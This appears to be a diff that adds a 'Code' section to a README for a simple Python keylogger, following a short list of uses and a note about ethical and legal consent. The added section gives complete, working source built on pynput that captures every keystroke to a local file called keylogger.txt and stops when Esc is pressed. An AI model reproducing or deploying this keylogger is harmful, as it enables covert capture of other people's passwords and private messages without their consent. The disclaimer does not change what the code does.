@@ -51,3 +51,29 @@ The provided script is a simple keylogger implemented in Python using the `pynpu
 - Monitoring for specific key sequences in controlled environments.  
 
 **Note**: Always ensure ethical and legal compliance when working with keylogging software. This type of script must only be used with proper consent and in accordance with local laws.
+
+### **Code**  
+
+Here is the Python code for the Simple Keylogger:
+```
+from pynput.keyboard import Key, Listener
+
+# Path to the log file
+log_file = "keylogger.txt"
+
+def log_key(key):
+    try:
+        with open(log_file, "a") as file:
+            file.write(key.char)
+    except AttributeError:
+        with open(log_file, "a") as file:
+            file.write(f'[{key}]')
+
+def stop_listener(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+# Start the listener
+with Listener(on_press=log_key, on_release=stop_listener) as listener:
+    listener.join()
